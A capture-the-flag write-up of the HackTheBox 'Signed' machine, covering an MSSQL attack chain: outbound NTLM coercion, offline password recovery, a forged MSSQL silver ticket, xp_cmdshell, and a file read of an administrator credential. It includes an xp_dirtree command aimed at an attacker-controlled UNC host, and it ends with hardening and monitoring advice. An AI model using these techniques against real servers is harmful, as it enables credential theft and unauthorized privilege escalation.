---
id: HTB-2025-011
title: Signed
excerpt: "Signed is an assume-breach MSSQL exercise: a low-privilege SQL login can induce outbound authentication, then a compromised service key lets a forged ticket change SQL authorization."
date: '2025-10-11'
updated: "2026-10-15"
tags:
  - WRITEUP
  - HACKTHEBOX
  - WINDOWS
  - MSSQL
  - KERBEROS
  - SILVER-TICKET
  - MEDIUM
category: WRITEUP
platform: HACKTHEBOX
target_os: WINDOWS
difficulty: MEDIUM
severity: MEDIUM
icon: ShieldAlert
author: '0x7CC'
---

## Starting position and route

The lab supplies a SQL login named `scott`. Its password is provided by the machine scenario and is omitted here. The route is **`scott` → outbound SMB authentication from MSSQL → offline recovery of `mssqlsvc`'s password → key for the MSSQL service → forged MSSQL service ticket with an authorized group → SQL `sysadmin` → OS execution as the SQL service → privileged file read and administrator credential**. The service-ticket part grants access to a particular service; it is not a universal domain login.

`DC01.signed.htb` is the lab server. `<LAB_PASSWORD>` denotes the provided or recovered password at each stage, never a literal string. Use a local authorized listener and keep response hashes and tickets out of published output.

## Establish the SQL identity

Port discovery finds MSSQL on TCP 1433. The provided `scott` login uses SQL authentication rather than Windows integrated authentication. Many clients have a switch for this distinction: if the client tries `SIGNED\scott`, the server rejects a domain login that was never supplied. A successful SQL login still has limited permissions. Check the current identity and role before trying administrative features:

```sql
SELECT SYSTEM_USER AS current_login, ORIGINAL_LOGIN() AS original_login;
SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
SELECT name, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
```

A zero in `is_sysadmin` explains why this login cannot simply enable command execution. `xp_cmdshell` executes through the SQL Server process or its configured proxy; even later success would need `whoami` to establish the Windows identity. Microsoft documents its [permissions and execution context](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql).

The account can execute `xp_dirtree`. Normally it lists folders for a SQL caller. Given a UNC path such as `\\<ATTACKER_IP>\probe`, the database host instead makes an SMB connection to that path. On an authorized listener this yields a NetNTLMv2 challenge-response for the account running the SQL service. It does **not** yield that account's raw NT hash or plaintext password. Confirm the captured username is `mssqlsvc`, and preserve only a redacted proof of the attempt.

The trigger is a SQL statement issued as `scott`, while the SMB listener runs on the assessment workstation. Replace `<ATTACKER_IP>` with that workstation's lab-facing address:

```sql
EXEC master.sys.xp_dirtree N'\\<ATTACKER_IP>\probe';
```

The `N` prefix makes the UNC string Unicode, as expected by the procedure. The two leading backslashes denote a remote SMB host; `probe` is only a share name for the connection attempt. Check the listener's source address and account name before treating the response as belonging to the SQL server. This step demonstrates an outbound authentication boundary, not access to the remote share.

If no authentication appears, check SMB egress, the UNC syntax, the listener, and which security principal performs filesystem access. A successful stored procedure response does not imply that the outbound TCP connection completed.

## Recover the service account and its key

The lab password for `mssqlsvc` is guessable offline from the captured challenge-response. This distinction matters: offline guessing tests candidates against the captured exchange without further logins to the target. Use a mode matching NetNTLMv2, and verify any candidate with an actual domain authentication before declaring it recovered. A password for `mssqlsvc` also permits deriving its RC4 Kerberos service key when that encryption type is accepted. Before forging anything, identify the account that owns the `MSSQLSvc/DC01.signed.htb:1433` service principal and check encryption and hardening settings. The service key must belong to the service named in the ticket; an arbitrary captured user key is insufficient.

An ordinary `mssqlsvc` Windows login is still not automatically SQL `sysadmin`. Enumerating SQL logins shows that the `SIGNED\IT` group has that server role. Kerberos service tickets carry authorization data, including group SIDs, in a protected PAC. With the service key and correct domain SID, SPN, realm, encryption type, and current time, a forged **MSSQL** ticket can assert an identity in that group. The SQL service can decrypt a ticket protected with its own key and apply the group membership. A normal user ticket without the group remains low privilege.

Use the reviewed [Impacket ticket tooling](https://github.com/fortra/impacket) appropriate to the lab build; record its version and the actual SPN. The tool needs the service key, the domain SID, the MSSQL SPN, the selected identity, and the IT group's RID. Keep key material out of the writeup. Validate the result with `SYSTEM_USER` and `IS_SRVROLEMEMBER('sysadmin')` in a fresh Kerberos SQL session. A saved `.ccache` file alone is no proof: the service must accept it. Time skew, an incorrect SPN, disabled RC4, or PAC validation can all prevent acceptance. Microsoft's [Kerberos service-ticket documentation](https://learn.microsoft.com/en-us/windows/win32/secauthn/session-tickets) provides the service-key model.

Do not substitute `CIFS/DC01` for `MSSQLSvc/...`. A CIFS ticket would target a different service and might use another key. Nothing about the MSSQL key alone establishes a usable CIFS ticket or domain-admin session.

## From SQL administration to host impact

Once the MSSQL login really has `sysadmin`, it can enable `xp_cmdshell` on the lab server. A controlled `whoami` call identifies the Windows token; on Signed it is the SQL service context, not automatically `NT AUTHORITY\SYSTEM`. This is a separate boundary from the Kerberos ticket: SQL authorization permits invoking a feature that starts an OS process with a service identity.

For a safe file-read check, use a harmless file with known contents and access controls comparable to the sensitive target. In the Kerberos-authenticated SQL session, the query shape is:

```sql
SELECT BulkColumn
FROM OPENROWSET(BULK N'<CANARY_PATH>', SINGLE_CLOB) AS evidence;
```

`<CANARY_PATH>` is an absolute path on DC01, not a file on the assessment workstation. `SINGLE_CLOB` returns text as one value; it does not bypass Windows file permissions. A returned value establishes that the SQL process can read the file. An access-denied error is informative about the current service token or path, but does not by itself show that the forged ticket failed.

The machine also permits a privileged SQL file-read route through `OPENROWSET(BULK ...)` when SQL executes with the forged authorization context. A read of the Administrator's PowerShell history exposes an administrator credential in the lab. That is a **file read and secret exposure**, followed by a separate administrator login test. It is not a consequence of forging a CIFS ticket. In a retest, read only a harmless canary file with the same ACL shape and record the effective context. A command returning rows does not prove a secret is current; authenticate independently before claiming administrator access.

The client must actually request Kerberos for the MSSQL SPN when testing the forged ticket. Some SQL tools default to SQL authentication when a username and password are supplied, or reuse an existing connection. Start a fresh session, confirm the authentication scheme on the server, and then evaluate the role. Otherwise, a legitimate high-privilege login left in the client could be mistaken for acceptance of the new ticket. Also record the service account's current key version or password-rotation state: a ticket encrypted with an old key can fail even when its PAC fields are otherwise correct. These checks make ticket acceptance a falsifiable observation.

## Separate credential, ticket, and host proof

| Checkpoint | Minimum evidence | Why the distinction matters |
| --- | --- | --- |
| `scott` SQL session | SQL authentication succeeds and `IS_SRVROLEMEMBER('sysadmin')` is zero. | This identifies the starting privilege and rules out simply enabling `xp_cmdshell`. |
| UNC authentication | The listener sees a redacted NetNTLMv2 response labelled `mssqlsvc`. | The service authenticated outward; the response is not itself an NT hash or password. |
| Recovered candidate | A lab authentication succeeds as `mssqlsvc`. | Offline tool output alone may indicate a wrong mode or malformed capture. |
| MSSQL ticket | A fresh Kerberos SQL session accepts the ticket and reports `sysadmin`. | A `.ccache` on disk is not proof of service acceptance or of the IT-group claim. |
| Host capability | `whoami` identifies the service token and a canary file read returns known content. | SQL administration, OS execution, and privileged file access are distinct effects. |

When a ticket fails, troubleshoot in the order the service validates it: target SPN, service-account key, realm and domain SID, group RID in the PAC, encryption support, clock skew, then SQL login mapping. Repeating the forgery with a different username before checking those fields obscures the actual mismatch. Conversely, a successful SQL role check does not justify claiming a domain-admin ticket; the forged ticket is scoped to `MSSQLSvc` and the final administrator access is established only by a later, separate authentication using the recovered credential.

## Close and test the chain

Restrict `xp_dirtree` and other filesystem operations for low-privilege SQL logins, and limit outbound SMB from SQL Server. Use a strong, managed service credential; rotate `mssqlsvc` after exposure, which invalidates tickets protected with its old key. Limit SQL `sysadmin` membership, keep `xp_cmdshell` disabled when unused, and protect administrator shell history from storing secrets.

A complete retest has several checks: `scott` can still perform its approved database work, a UNC path no longer reaches an untrusted listener, the old service password fails, a ticket built from the old key is rejected, and a low-privilege SQL session cannot enable OS execution or read administrator files. Monitor unexpected outbound SMB, service-key changes, Kerberos logins to MSSQL, configuration changes to `xp_cmdshell`, and bulk file reads. A forged service ticket may not produce a new KDC issuance event, so service-side telemetry matters.
